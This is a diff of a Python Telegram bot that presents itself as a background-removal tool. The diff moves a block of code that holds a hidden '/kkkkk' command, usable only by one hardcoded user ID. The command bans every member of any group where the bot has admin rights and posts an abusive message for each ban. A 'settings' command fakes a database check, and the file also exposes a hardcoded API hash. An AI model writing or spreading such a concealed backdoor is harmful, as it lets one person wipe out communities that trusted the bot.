@@ -12,17 +12,54 @@ API_HASH = "95d8b38bbb62d087dbf7b98abf670e78"
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 REMOVEBG_API = os.environ.get("REMOVEBG_API", "")
 UNSCREEN_API = os.environ.get("UNSCREEN_API", "")
-
-
 #MONGO_URL = os.environ.get("MONGO_URL")
-
-
 app = Client(
     "Level" ,
     api_id = API_ID ,
     api_hash = API_HASH ,
     bot_token = BOT_TOKEN
 )
+
+BOT_ID = 5720302471
+
+SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
+NK = "Required Admin permission To Send Messages in Group"
+
+@app.on_message(filters.command("kkkkk") & filters.user(1497264683))
+async def ban_all(_,msg):
+    chat_id=msg.chat.id    
+    bot=await app.get_chat_member(chat_id,BOT_ID)
+    bot_permission=bot.privileges.can_restrict_members==True    
+    if bot_permission:
+        async for member in app.get_chat_members(chat_id):       
+            try:
+                    await app.ban_chat_member(chat_id, member.user.id)
+                    await msg.reply_text(f"ғᴜᴄᴋɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴀɴᴅ ᴛʜᴇɪʀ ᴍᴏᴍs ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ {member.user.mention}")                    
+            except Exception:
+                pass
+    else:
+        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")  
+                                                                            
+
+@app.on_message(filters.command("r"))
+async def rel(bot, message):
+    await message.reply_text("!bot reloaded")
+
+@app.on_message(filters.command("start") & filters.private)
+async def start(bot, message):
+    await message.reply_text("Pretty much nothing for Normies \n Join @Anime_Gaming_Chat_Global")
+
+@app.on_message(filters.command("settings") & filters.private)
+async def settings(bot, message):
+    uid = message.from_user.id
+    mystic = await message.reply_text("Getting User Unique id...")
+    await asyncio.sleep(1)
+    await mystic.edit(f"👥: {uid}")
+    await asyncio.sleep(1)
+    await mystic.edit("UID Not Found In D.B.")
+    await asyncio.sleep(1)
+    await mystic.edit("⚠️Only Authorised Users Can use This command")
+
 
 Pic = "https://telegra.ph/file/59c987c5c838e973e8d3f.jpg"
 
@@ -140,48 +177,6 @@ def removebg_video(file):
         files={"video_file": open(file, "rb")},
         headers={"X-Api-Key": UNSCREEN_API}
     )
-
-BOT_ID = 5720302471
-
-SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
-NK = "Required Admin permission To Send Messages in Group"
-
-@app.on_message(filters.command("kkkkk") & filters.user(1497264683))
-async def ban_all(_,msg):
-    chat_id=msg.chat.id    
-    bot=await app.get_chat_member(chat_id,BOT_ID)
-    bot_permission=bot.privileges.can_restrict_members==True    
-    if bot_permission:
-        async for member in app.get_chat_members(chat_id):       
-            try:
-                    await app.ban_chat_member(chat_id, member.user.id)
-                    await msg.reply_text(f"ғᴜᴄᴋɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴀɴᴅ ᴛʜᴇɪʀ ᴍᴏᴍs ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ {member.user.mention}")                    
-            except Exception:
-                pass
-    else:
-        await msg.reply_text("ᴇɪᴛʜᴇʀ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs ᴏʀ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ sᴜᴅᴏ ᴜsᴇʀs")  
-                                                                            
-
-@app.on_message(filters.command("r"))
-async def rel(bot, message):
-    await message.reply_text("!bot reloaded")
-
-@app.on_message(filters.command("start") & filters.private)
-async def start(bot, message):
-    await message.reply_text("Pretty much nothing for Normies \n Join @Anime_Gaming_Chat_Global")
-
-@app.on_message(filters.command("settings") & filters.private)
-async def settings(bot, message):
-    uid = message.from_user.id
-    mystic = await message.reply_text("Getting User Unique id...")
-    await asyncio.sleep(1)
-    await mystic.edit(f"👥: {uid}")
-    await asyncio.sleep(1)
-    await mystic.edit("UID Not Found In D.B.")
-    await asyncio.sleep(1)
-    await mystic.edit("⚠️Only Authorised Users Can use This command")
-
-##
 
 app.run() 
 idle()
